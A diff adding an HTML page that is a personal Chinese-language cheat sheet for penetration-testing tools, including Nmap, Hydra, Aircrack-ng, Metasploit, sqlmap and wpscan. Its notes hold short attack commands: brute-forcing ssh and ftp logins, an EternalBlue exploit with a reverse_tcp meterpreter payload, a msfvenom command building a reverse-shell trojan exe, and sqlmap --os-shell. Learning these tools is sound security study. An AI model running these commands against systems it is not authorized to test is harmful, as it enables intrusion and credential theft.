@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>田果田，欢迎回来</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;700&display=swap');
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: #0c0c0c;
+      color: #00ff41;
+      font-family: 'Fira Mono', 'Consolas', mono;
+      overflow: hidden;
+    }
+    body {
+      min-height: 100vh;
+    }
+    .matrix {
+      position: fixed;
+      width: 100vw;
+      height: 100vh;
+      top: 0; left: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+    .hacker-container {
+      position: absolute;
+      z-index: 1;
+      left: 0; right: 0;
+      top: 0; bottom: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      font-size: 2.2rem;
+      letter-spacing: 0.2rem;
+      text-shadow:
+        0 0 6px #00FF41,
+        0 0 20px #00FF4188,
+        0 0 40px #00fa6a33;
+      background: rgba(0,0,0,0.65);
+      border-radius: 15px;
+      box-shadow: 0 0 40px #00FF4166;
+      min-width: 340px;
+      max-width: 95vw;
+      min-height: 140px;
+      margin: auto;
+      width: max-content;
+      height: max-content;
+      padding: 50px 32px;
+      animation: fadeInShow 0.7s;
+    }
+    .typed-text { white-space: pre; display: inline-block; }
+    .cursor {
+      display: inline-block;
+      width: 1ch;
+      background: #00FF41;
+      animation: blink 0.8s steps(1, start) infinite;
+      margin-left: 2px;
+    }
+    @keyframes blink { 0%, 49% { background: #00ff41; } 50%, 100% { background: transparent; } }
+    @keyframes fadeInShow { from {opacity:0; transform:scale(1.06);} to{opacity: 1;transform:scale(1);} }
+
+    .note-section { 
+      display: none;
+      z-index: 2;
+      min-height: 100vh;
+      position: relative;
+    }
+    .container {
+      max-width: 1100px;
+      margin: 40px auto;
+      padding: 0 25px;
+    }
+    h1 {
+      color: #72ffb7;
+      font-size: 2.2rem;
+      margin-bottom: 1.2em;
+    }
+    .folder-grid {
+      margin-top: 30px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 28px;
+    }
+    .folder {
+      padding: 22px 17px;
+      background: #232e1f;
+      border-radius: 13px;
+      box-shadow: 0 2px 12px #1ef88b48;
+      display: flex;
+      flex-direction: column;
+    }
+    .folder-title {
+      font-weight: bold;
+      color: #42f56d;
+      font-size: 1.25rem;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+    }
+    .folder-title::before { content: "📁"; margin-right: 8px; }
+    .note-list {
+      list-style: none;
+      padding-left: 0;
+      margin: 0;
+      font-size: 1rem;
+    }
+    .note-list li { margin: 8px 0;}
+    .note-link {
+      color: #21e17c;
+      text-decoration: none;
+      padding-left: 8px;
+      transition: color .2s;
+      cursor: pointer;
+    }
+    .note-link:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+    .tab {
+      color: #7382fd;
+      background: #23203a;
+      border-radius: 9px;
+      display: inline-block;
+      padding: 4px 14px;
+      margin-right: 7px;
+      margin-bottom: 10px;
+      font-size: 1rem;
+      text-shadow: 0 1px 6px #35478c33;
+    }
+    .note-content-bg {
+      background: #111d13;
+      padding: 24px 22px;
+      border-radius: 7px;
+      margin-top: 18px;
+      box-shadow: 0 2px 10px #21e17c13;
+      color: #d6ffd6;
+      font-size: 1.08rem;
+      min-height: 160px;
+    }
+
+    @media (max-width: 650px) {
+      .container {
+        padding: 0 6px;
+      }
+      .hacker-container {
+        font-size: 1.3rem;
+        padding: 28px 5px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <canvas class="matrix"></canvas>
+  <!-- 欢迎区 -->
+  <div class="hacker-container" id="welcome-area">
+    <span class="typed-text"></span><span class="cursor"></span>
+  </div>
+  <!-- Obsidian风使用笔记区 -->
+  <div class="note-section" id="note-section">
+    <div class="container">
+      <h1>安全工具使用笔记整理库</h1>
+      <div class="folder-grid">
+        <div class="folder">
+          <div class="folder-title">Kali 工具</div>
+          <ul class="note-list">
+            <li><a class="note-link" data-note="nmap">Nmap 使用笔记</a></li>
+            <li><a class="note-link" data-note="hydra">Hydra 爆破工具笔记</a></li>
+            <li><a class="note-link" data-note="aircrack">Aircrack-ng 笔记</a></li>
+            <li><a class="note-link" data-note="burpsuite">BurpSuite 基本笔记</a></li>
+          </ul>
+        </div>
+        <div class="folder">
+          <div class="folder-title">MSF(Metasploit) 专区</div>
+          <ul class="note-list">
+            <li><a class="note-link" data-note="msf-basic">MSF 基础入门笔记</a></li>
+            <li><a class="note-link" data-note="msf-module">模块与漏洞利用笔记</a></li>
+            <li><a class="note-link" data-note="msf-exp">生成与使用 Exploit 笔记</a></li>
+            <li><a class="note-link" data-note="msf-post">Post-Exploitation 笔记</a></li>
+          </ul>
+        </div>
+        <div class="folder">
+          <div class="folder-title">信息收集工具</div>
+          <ul class="note-list">
+            <li><a class="note-link" data-note="whois">Whois 查询笔记</a></li>
+            <li><a class="note-link" data-note="theharvester">theHarvester 笔记</a></li>
+          </ul>
+        </div>
+        <div class="folder">
+          <div class="folder-title">Web 安全工具</div>
+          <ul class="note-list">
+            <li><a class="note-link" data-note="sqlmap">SQLMap 注入检测笔记</a></li>
+            <li><a class="note-link" data-note="wpscan">wpscan 检测笔记</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="note-content-bg" id="content-area">
+        <span style="color:#6dff9d;">👈 点击左侧使用笔记，右侧展示详细内容</span>
+      </div>
+    </div>
+  </div>
+  <script>
+    // 英文 matrix rain
+    const canvas = document.querySelector('.matrix');
+    const ctx = canvas.getContext('2d');
+    let width = canvas.width = window.innerWidth;
+    let height = canvas.height = window.innerHeight;
+    const fontSize = 22;
+    const columns = Math.floor(width / fontSize);
+    const drops = [];
+    for(let x = 0; x < columns; x++) drops[x] = Math.random()*height/fontSize;
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+-=[]{}|;:,.<>/?".split('');
+    function drawMatrix() {
+      ctx.fillStyle = 'rgba(12, 12, 12, .18)';
+      ctx.fillRect(0, 0, width, height);
+      ctx.font = fontSize + "px Fira Mono, Consolas, monospace";
+      ctx.fillStyle = '#00FF41';
+      for(let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random()*chars.length)];
+        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+        if(drops[i]*fontSize > height && Math.random() > 0.97) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+    setInterval(drawMatrix, 57);
+    window.addEventListener('resize', () => {
+      width = canvas.width = window.innerWidth;
+      height = canvas.height = window.innerHeight;
+    });
+
+    // 类型机+自动切换到笔记区
+    const message = '田果田，欢迎回来';
+    const typedSpan = document.querySelector('.typed-text');
+    let idx = 0;
+    function typeEffect() {
+      typedSpan.textContent = message.slice(0, idx);
+      idx++;
+      if(idx <= message.length) {
+        setTimeout(typeEffect, 150);
+      } else {
+        setTimeout(() => {
+          document.getElementById('welcome-area').style.display = "none";
+          document.getElementById('note-section').style.display = "block";
+        }, 800);
+      }
+    }
+    typeEffect();
+
+    // 预设各使用笔记内容
+    const notes = {
+      nmap: `
+<span class="tab">Nmap 简介</span>
+Nmap(Network Mapper) 是业界流行的端口扫描器，用于主机发现和服务识别。
+<span class="tab">常用命令</span>
+<pre>
+nmap -T4 -A -v 192.168.1.1
+nmap -sS -p 1-65535 target.com
+nmap --script vuln target.com
+</pre>
+- 服务识别：nmap -sV target
+- 漏洞扫描：nmap --script vuln target.com
+      `,
+      hydra: `
+<span class="tab">Hydra 爆破工具</span>
+适用于暴力破解多种协议密码（ftp、ssh、http等）。
+<pre>
+hydra -l admin -P pass.txt ftp://192.168.1.5
+hydra -L users.txt -P passwords.txt ssh://target.com
+</pre>
+      `,
+      aircrack: `
+<span class="tab">Aircrack-ng</span>
+无线网络攻防常用套件，支持WEP、WPA破解。
+<pre>
+# 抓包破解流程
+airmon-ng start wlan0
+airodump-ng wlan0mon
+aireplay-ng -1 0 -a [AP_MAC] -h [你的MAC] wlan0mon
+aircrack-ng -w dict.txt capture.cap
+</pre>
+      `,
+      burpsuite: `
+<span class="tab">BurpSuite</span>
+Web 安全测试，流量拦截、自动化漏洞挖掘等。
+<span class="tab">常用功能</span>
+- 拦截代理、Repeater、Scanner、Intruder
+- 进行SQL注入、XSS测试、会话管理分析等
+      `,
+      "msf-basic": `
+<span class="tab">Metasploit 基础</span>
+MSF是现代攻防的主要渗透工具。
+<pre>
+msfconsole
+search exploit
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target.com
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 你的IP
+exploit
+</pre>
+      `,
+      "msf-module": `
+<span class="tab">模块与漏洞利用</span>
+- exploit: 漏洞利用模块
+- auxiliary: 辅助模块（如信息收集）
+- payload: 负载（如反弹 shell）
+- post: 后渗透模块
+      `,
+      "msf-exp": `
+<span class="tab">生成和使用 Exploit</span>
+利用 msfvenom 生成木马：
+<pre>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe > shell.exe
+</pre>
+      `,
+      "msf-post": `
+<span class="tab">后渗透笔记</span>
+Hashdump、权限提升、本地信息收集等。
+<pre>
+meterpreter > getsystem
+meterpreter > run post/windows/gather/enum_logged_on_users
+</pre>
+      `,
+      whois: `
+<span class="tab">Whois 查询</span>
+获取域名注册人等信息。适用于前期信息收集。
+<pre>
+whois baidu.com
+</pre>
+      `,
+      theharvester: `
+<span class="tab">theHarvester 用法</span>
+信息收集自动化工具。
+<pre>
+theHarvester -d target.com -l 500 -b google
+</pre>
+      `,
+      sqlmap: `
+<span class="tab">SQLMap 使用笔记</span>
+SQL自动化注入测试工具。
+<pre>
+sqlmap -u "http://site.com/vuln.php?id=1" --batch --dbs
+sqlmap -r request.txt --os-shell
+</pre>
+      `,
+      wpscan: `
+<span class="tab">wpscan 使用笔记</span>
+用于 WordPress 漏洞检测。
+<pre>
+wpscan --url https://target.com -e vp,vt,cb,dbe,u --api-token YOURTOKEN
+</pre>
+      `
+    };
+    // 绑定笔记点击事件
+    document.addEventListener('DOMContentLoaded', function() {
+      document.querySelectorAll('.note-link').forEach(link=>{
+        link.addEventListener('click', e=>{
+          e.preventDefault();
+          const noteName = link.getAttribute('data-note');
+          const area = document.getElementById('content-area');
+          if(notes[noteName]){
+            area.innerHTML = notes[noteName];
+          }else{
+            area.innerHTML = '<span style="color:#c44747;">❓ 该笔记暂无内容</span>';
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
